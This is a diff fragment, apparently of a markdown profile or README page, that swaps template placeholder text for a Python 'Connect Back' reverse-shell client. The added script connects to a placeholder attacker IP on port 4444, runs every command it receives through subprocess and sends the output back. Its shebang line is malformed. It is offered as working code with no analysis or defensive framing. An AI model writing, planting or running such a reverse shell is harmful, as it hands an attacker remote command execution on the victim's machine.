@@ -23,13 +23,42 @@ Open for collab!
 ##  \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ 
 ##
 
-- Bulleted
-- List
+#!/bin/bash/py
+# Connect Back
 
-1. Numbered
-2. List
+import socket
+import subprocess
 
-**Bold** and _Italic_ and `Code` text
+SERVER_HOST = "<IP Address of Attacker>"
+SERVER_PORT = 4444
+BUFFER_SIZE = 1024
+
+#Create socket and connect to the server
+s = socket.socket()
+
+#Connect to server (banana one)
+s.connect((SERVER_HOST, SERVER_PORT))
+
+#Receive check message
+message = s.recv(BUFFER_SIZE).decode()
+print("Server:", message)
+
+#The LOOP
+while True:
+    #Receive command from server
+    command = s.recv(BUFFER_SIZE).decode()
+    if command.lower() == "exit":
+        #If the command is exit, just break out from the loop
+        break
+
+    #Execute command and retrieve results
+    output = subprocess.getoutput(command)
+
+    #Send results back to the server (banana-one)
+    s.send(output.encode())
+
+#Close client connection
+s.close()
 
 [Link](url) and ![Image](src)
 ```
